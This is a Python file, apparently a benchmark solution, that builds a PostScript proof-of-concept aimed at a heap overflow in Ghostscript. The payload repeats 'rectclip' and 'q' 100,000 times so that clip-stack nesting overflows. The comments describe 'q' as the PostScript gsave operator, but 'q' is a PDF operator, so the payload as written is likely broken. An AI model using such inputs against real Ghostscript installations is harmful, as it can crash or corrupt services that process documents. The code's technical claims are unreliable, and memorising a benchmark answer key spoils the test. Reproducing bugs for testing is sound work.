import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability 'nesting depth is not checked before pushing a clip mark' corresponds to 
        OSS-Fuzz issue 42537 in Ghostscript (specifically in gdevvec.c).
        The issue allows a heap buffer overflow when the clip stack depth exceeds the allocated size 
        in vector devices (like pdfwrite) due to missing bounds checks during 'c_push_mark'.
        
        To trigger this, we need to create a deeply nested stack of clip paths.
        Using a loop in PostScript is the most efficient way to achieve high nesting depth 
        with minimal file size (maximizing the score).
        """
        
        # We use a PostScript loop to repeatedly modify the clip path and save the graphics state.
        # 'rectclip' updates the clip path (ensuring a new clip ID is generated, which forces a push).
        # 'q' (gsave) pushes the graphics state.
        # 100,000 iterations is sufficient to overflow typical fixed-size buffers or heap allocations 
        # meant for stack tracking, while staying within memory limits and execution time.
        
        iterations = 100000
        
        # Construct the PostScript payload
        # %!PS
        # /x { 0 0 1 1 rectclip q } def
        # 100000 { x } repeat
        
        poc = b"%!PS\n"
        poc += b"/x { 0 0 1 1 rectclip q } def\n"
        poc += f"{iterations} {{ x }} repeat\n".encode('ascii')
        
        return poc
